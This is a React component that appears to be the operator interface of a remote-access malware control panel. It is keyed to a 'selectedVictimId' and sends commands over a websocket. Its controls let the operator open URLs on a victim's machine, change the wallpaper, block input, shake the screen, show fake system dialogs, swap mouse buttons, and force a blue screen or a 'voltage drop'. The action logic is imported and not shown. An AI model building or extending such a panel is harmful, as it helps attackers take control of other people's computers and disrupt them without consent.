"use client";

import { useEffect } from "react";
import { useQueryClient } from "@tanstack/react-query";

import { usePanelDetailView } from "../panel-detail-view-provider";
import { usePanelWS } from "../../../ws/ws-provider";
import { bindRoflActions } from "./rofl/bind-rofl-actions";

export function RoflSection() {
   const detail = usePanelDetailView();
   const ws = usePanelWS();
   const qc = useQueryClient();

   useEffect(() => {
      return bindRoflActions({
         selectedVictimId: detail.selectedVictimId,
         qc,
         ws,
      });
   }, [detail.selectedVictimId, qc, ws]);

   return (
      <div className="detail-section">
         <div className="grid gap-[18px]">
            <div className="w-[420px] max-w-[calc(100vw-420px)] rounded-[18px] border border-white/15 bg-[rgba(30,30,30,0.92)] p-[16px_18px] shadow-[0_18px_44px_rgba(0,0,0,0.82),0_0_0_3px_rgba(255,255,255,0.04)] backdrop-blur-[10px]">
               <div className="p-[6px_2px_2px]">
                  <div className="mb-[4px] text-[18px] font-extrabold text-white">Open url</div>
                  <div className="mb-[10px] h-[2px] bg-[var(--line)]" />
                  <div className="grid grid-cols-[1fr_max-content] gap-[10px]">
                     <input
                        id="roflUrlInput"
                        className="w-full rounded-[10px] border border-white/15 bg-black/40 px-[10px] py-[8px] text-[15px] text-white outline-none placeholder:text-white/60 focus:border-white/95"
                        placeholder="URL"
                     />
                     <button
                        id="roflOpenBtn"
                        className="min-w-[120px] rounded-[12px] border border-white/20 bg-[rgba(30,30,30,0.85)] px-[22px] pb-[4px] pt-[6px] text-[14px] font-extrabold uppercase tracking-[0.05em] text-[#f5f5f5] shadow-[0_10px_24px_rgba(0,0,0,0.7)] transition-[background,border-color,transform,box-shadow] duration-150 hover:-translate-y-[1px] hover:bg-[rgba(55,55,55,0.96)] hover:border-white/30 hover:shadow-[0_14px_30px_rgba(0,0,0,0.86)] active:translate-y-0"
                        style={{ borderBottom: "4px solid var(--line)" }}
                     >
                        Open
                     </button>
                  </div>
                  <div className="mt-[10px] h-[2px] bg-[var(--line)]" />
               </div>
            </div>

            <div className="w-[420px] max-w-[calc(100vw-420px)] rounded-[18px] border border-white/15 bg-[rgba(30,30,30,0.92)] p-[16px_18px] shadow-[0_18px_44px_rgba(0,0,0,0.82),0_0_0_3px_rgba(255,255,255,0.04)] backdrop-blur-[10px]">
               <div className="p-[6px_2px_2px]">
                  <div className="mb-[4px] text-[18px] font-extrabold text-white">Change the background</div>
                  <div className="mb-[10px] h-[2px] bg-[var(--line)]" />
                  <div className="grid grid-cols-[1fr_max-content] gap-[10px]">
                     <input
                        id="roflBgUrlInput"
                        className="w-full rounded-[10px] border border-white/15 bg-black/40 px-[10px] py-[8px] text-[15px] text-white outline-none placeholder:text-white/60 focus:border-white/95"
                        placeholder="URL"
                     />
                     <button
                        id="roflChangeBtn"
                        className="min-w-[120px] rounded-[12px] border border-white/20 bg-[rgba(30,30,30,0.85)] px-[22px] pb-[4px] pt-[6px] text-[14px] font-extrabold uppercase tracking-[0.05em] text-[#f5f5f5] shadow-[0_10px_24px_rgba(0,0,0,0.7)] transition-[background,border-color,transform,box-shadow] duration-150 hover:-translate-y-[1px] hover:bg-[rgba(55,55,55,0.96)] hover:border-white/30 hover:shadow-[0_14px_30px_rgba(0,0,0,0.86)] active:translate-y-0"
                        style={{ borderBottom: "4px solid var(--line)" }}
                     >
                        Change
                     </button>
                  </div>
                  <div className="mt-[10px] h-[2px] bg-[var(--line)]" />
               </div>
            </div>

            <div className="w-[420px] max-w-[calc(100vw-420px)] rounded-[18px] border border-white/15 bg-[rgba(30,30,30,0.92)] p-[16px_18px] shadow-[0_18px_44px_rgba(0,0,0,0.82),0_0_0_3px_rgba(255,255,255,0.04)] backdrop-blur-[10px]">
               <div className="p-[6px_2px_2px]">
                  <div className="mb-[4px] text-[18px] font-extrabold text-white">Block input</div>
                  <div className="mb-[10px] h-[2px] bg-[var(--line)]" />
                  <div className="flex gap-[12px]">
                     <button
                        id="roflBlockOnBtn"
                        className="min-w-[120px] rounded-[12px] border border-white/20 bg-[rgba(30,30,30,0.85)] px-[22px] pb-[4px] pt-[6px] text-[14px] font-extrabold uppercase tracking-[0.05em] text-[#f5f5f5] shadow-[0_10px_24px_rgba(0,0,0,0.7)] transition-[background,border-color,transform,box-shadow] duration-150 hover:-translate-y-[1px] hover:bg-[rgba(55,55,55,0.96)] hover:border-white/30 hover:shadow-[0_14px_30px_rgba(0,0,0,0.86)] active:translate-y-0"
                        style={{ borderBottom: "4px solid var(--line)" }}
                     >
                        Turn on
                     </button>
                     <button
                        id="roflBlockOffBtn"
                        className="min-w-[120px] rounded-[12px] border border-white/20 bg-[rgba(30,30,30,0.85)] px-[22px] pb-[4px] pt-[6px] text-[14px] font-extrabold uppercase tracking-[0.05em] text-[#f5f5f5] shadow-[0_10px_24px_rgba(0,0,0,0.7)] transition-[background,border-color,transform,box-shadow] duration-150 hover:-translate-y-[1px] hover:bg-[rgba(55,55,55,0.96)] hover:border-white/30 hover:shadow-[0_14px_30px_rgba(0,0,0,0.86)] active:translate-y-0"
                        style={{ borderBottom: "4px solid var(--line)" }}
                     >
                        Turn off
                     </button>
                  </div>
               </div>
            </div>

            <div className="w-[420px] max-w-[calc(100vw-420px)] rounded-[18px] border border-white/15 bg-[rgba(30,30,30,0.92)] p-[16px_18px] shadow-[0_18px_44px_rgba(0,0,0,0.82),0_0_0_3px_rgba(255,255,255,0.04)] backdrop-blur-[10px]">
               <div className="p-[6px_2px_2px]">
                  <div className="mb-[4px] text-[18px] font-extrabold text-white">Shake screen</div>
                  <div className="mb-[10px] h-[2px] bg-[var(--line)]" />
                  <div className="flex gap-[12px]">
                     <button
                        id="roflShakeOnBtn"
                        className="min-w-[120px] rounded-[12px] border border-white/20 bg-[rgba(30,30,30,0.85)] px-[22px] pb-[4px] pt-[6px] text-[14px] font-extrabold uppercase tracking-[0.05em] text-[#f5f5f5] shadow-[0_10px_24px_rgba(0,0,0,0.7)] transition-[background,border-color,transform,box-shadow] duration-150 hover:-translate-y-[1px] hover:bg-[rgba(55,55,55,0.96)] hover:border-white/30 hover:shadow-[0_14px_30px_rgba(0,0,0,0.86)] active:translate-y-0"
                        style={{ borderBottom: "4px solid var(--line)" }}
                     >
                        Turn on
                     </button>
                     <button
                        id="roflShakeOffBtn"
                        className="min-w-[120px] rounded-[12px] border border-white/20 bg-[rgba(30,30,30,0.85)] px-[22px] pb-[4px] pt-[6px] text-[14px] font-extrabold uppercase tracking-[0.05em] text-[#f5f5f5] shadow-[0_10px_24px_rgba(0,0,0,0.7)] transition-[background,border-color,transform,box-shadow] duration-150 hover:-translate-y-[1px] hover:bg-[rgba(55,55,55,0.96)] hover:border-white/30 hover:shadow-[0_14px_30px_rgba(0,0,0,0.86)] active:translate-y-0"
                        style={{ borderBottom: "4px solid var(--line)" }}
                     >
                        Turn off
                     </button>
                  </div>
               </div>
            </div>

            <div className="w-[420px] max-w-[calc(100vw-420px)] rounded-[18px] border border-white/15 bg-[rgba(30,30,30,0.92)] p-[16px_18px] shadow-[0_18px_44px_rgba(0,0,0,0.82),0_0_0_3px_rgba(255,255,255,0.04)] backdrop-blur-[10px]">
               <div className="p-[6px_2px_2px]">
                  <div className="mb-[4px] text-[18px] font-extrabold text-white">Message box</div>
                  <div className="mb-[10px] h-[2px] bg-[var(--line)]" />

                  <div className="grid gap-[10px]">
                     <div className="grid grid-cols-[90px_1fr] items-center gap-[10px]">
                        <div className="text-[14px] font-bold text-white/85">Icon:</div>
                        <select id="roflMsgIcon" className="h-[34px] rounded-[10px] border border-white/15 bg-black/40 px-[10px] text-[14px] text-white outline-none">
                           <option value="info">Info</option>
                           <option value="error">Error</option>
                           <option value="warning">Warning</option>
                           <option value="question">Question</option>
                           <option value="none">None</option>
                        </select>
                     </div>

                     <div className="grid grid-cols-[90px_1fr] items-center gap-[10px]">
                        <div className="text-[14px] font-bold text-white/85">Header:</div>
                        <input
                           id="roflMsgHeader"
                           className="h-[34px] rounded-[10px] border border-white/15 bg-black/40 px-[10px] text-[14px] text-white outline-none placeholder:text-white/60 focus:border-white/95"
                           placeholder="Header text"
                        />
                     </div>

                     <div className="grid grid-cols-[90px_1fr] items-start gap-[10px]">
                        <div className="pt-[6px] text-[14px] font-bold text-white/85">Content:</div>
                        <textarea
                           id="roflMsgContent"
                           rows={3}
                           className="rounded-[10px] border border-white/15 bg-black/40 px-[10px] py-[8px] text-[14px] text-white outline-none placeholder:text-white/60 focus:border-white/95"
                           placeholder="Message content"
                        />
                     </div>

                     <div className="mt-[4px] h-[2px] bg-[var(--line)]" />

                     <div className="grid grid-cols-[90px_1fr_max-content] items-center gap-[10px]">
                        <div className="text-[14px] font-bold text-white/85">Buttons:</div>
                        <select id="roflMsgButtons" className="h-[34px] rounded-[10px] border border-white/15 bg-black/40 px-[10px] text-[14px] text-white outline-none">
                           <option value="ok">OK</option>
                           <option value="okcancel">OK / Cancel</option>
                           <option value="yesno">Yes / No</option>
                           <option value="yesnocancel">Yes / No / Cancel</option>
                           <option value="retrycancel">Retry / Cancel</option>
                           <option value="abortretryignore">Abort / Retry / Ignore</option>
                        </select>
                        <button
                           id="roflMsgSendBtn"
                           className="min-w-[120px] rounded-[12px] border border-white/20 bg-[rgba(30,30,30,0.85)] px-[22px] pb-[4px] pt-[6px] text-[14px] font-extrabold uppercase tracking-[0.05em] text-[#f5f5f5] shadow-[0_10px_24px_rgba(0,0,0,0.7)] transition-[background,border-color,transform,box-shadow] duration-150 hover:-translate-y-[1px] hover:bg-[rgba(55,55,55,0.96)] hover:border-white/30 hover:shadow-[0_14px_30px_rgba(0,0,0,0.86)] active:translate-y-0"
                           style={{ borderBottom: "4px solid var(--line)" }}
                        >
                           Send
                        </button>
                     </div>
                  </div>
               </div>
            </div>

            <div className="w-[420px] max-w-[calc(100vw-420px)] rounded-[18px] border border-white/15 bg-[rgba(30,30,30,0.92)] p-[16px_18px] shadow-[0_18px_44px_rgba(0,0,0,0.82),0_0_0_3px_rgba(255,255,255,0.04)] backdrop-blur-[10px]">
               <div className="p-[6px_2px_2px]">
                  <div className="mb-[4px] text-[18px] font-extrabold text-white">Swap Mouse Buttons</div>
                  <div className="mb-[10px] h-[2px] bg-[var(--line)]" />
                  <div className="flex gap-[12px]">
                     <button
                        id="roflSwapLeftRightBtn"
                        className="min-w-[120px] rounded-[12px] border border-white/20 bg-[rgba(30,30,30,0.85)] px-[22px] pb-[4px] pt-[6px] text-[14px] font-extrabold uppercase tracking-[0.05em] text-[#f5f5f5] shadow-[0_10px_24px_rgba(0,0,0,0.7)] transition-[background,border-color,transform,box-shadow] duration-150 hover:-translate-y-[1px] hover:bg-[rgba(55,55,55,0.96)] hover:border-white/30 hover:shadow-[0_14px_30px_rgba(0,0,0,0.86)] active:translate-y-0"
                        style={{ borderBottom: "4px solid var(--line)" }}
                     >
                        Left | Right
                     </button>
                     <button
                        id="roflSwapRightLeftBtn"
                        className="min-w-[120px] rounded-[12px] border border-white/20 bg-[rgba(30,30,30,0.85)] px-[22px] pb-[4px] pt-[6px] text-[14px] font-extrabold uppercase tracking-[0.05em] text-[#f5f5f5] shadow-[0_10px_24px_rgba(0,0,0,0.7)] transition-[background,border-color,transform,box-shadow] duration-150 hover:-translate-y-[1px] hover:bg-[rgba(55,55,55,0.96)] hover:border-white/30 hover:shadow-[0_14px_30px_rgba(0,0,0,0.86)] active:translate-y-0"
                        style={{ borderBottom: "4px solid var(--line)" }}
                     >
                        Right | Left
                     </button>
                  </div>
               </div>
            </div>

            <div className="w-[420px] max-w-[calc(100vw-420px)] rounded-[18px] border border-white/15 bg-[rgba(30,30,30,0.92)] p-[16px_18px] shadow-[0_18px_44px_rgba(0,0,0,0.82),0_0_0_3px_rgba(255,255,255,0.04)] backdrop-blur-[10px]">
               <div className="p-[6px_2px_2px]">
                  <div className="mb-[4px] text-[18px] font-extrabold text-white">Reboot</div>
                  <div className="mb-[10px] h-[2px] bg-[var(--line)]" />
                  <div className="flex gap-[12px]">
                     <button
                        id="roflBsodBtn"
                        className="min-w-[120px] rounded-[12px] border border-white/20 bg-[rgba(30,30,30,0.85)] px-[22px] pb-[4px] pt-[6px] text-[14px] font-extrabold uppercase tracking-[0.05em] text-[#f5f5f5] shadow-[0_10px_24px_rgba(0,0,0,0.7)] transition-[background,border-color,transform,box-shadow] duration-150 hover:-translate-y-[1px] hover:bg-[rgba(55,55,55,0.96)] hover:border-white/30 hover:shadow-[0_14px_30px_rgba(0,0,0,0.86)] active:translate-y-0"
                        style={{ borderBottom: "4px solid var(--line)" }}
                     >
                        BSoD
                     </button>
                     <button
                        id="roflVoltageBtn"
                        className="min-w-[120px] rounded-[12px] border border-white/20 bg-[rgba(30,30,30,0.85)] px-[22px] pb-[4px] pt-[6px] text-[14px] font-extrabold uppercase tracking-[0.05em] text-[#f5f5f5] shadow-[0_10px_24px_rgba(0,0,0,0.7)] transition-[background,border-color,transform,box-shadow] duration-150 hover:-translate-y-[1px] hover:bg-[rgba(55,55,55,0.96)] hover:border-white/30 hover:shadow-[0_14px_30px_rgba(0,0,0,0.86)] active:translate-y-0"
                        style={{ borderBottom: "4px solid var(--line)" }}
                     >
                        VOLTAGE DROP
                     </button>
                  </div>
               </div>
            </div>
         </div>
      </div>
   );
}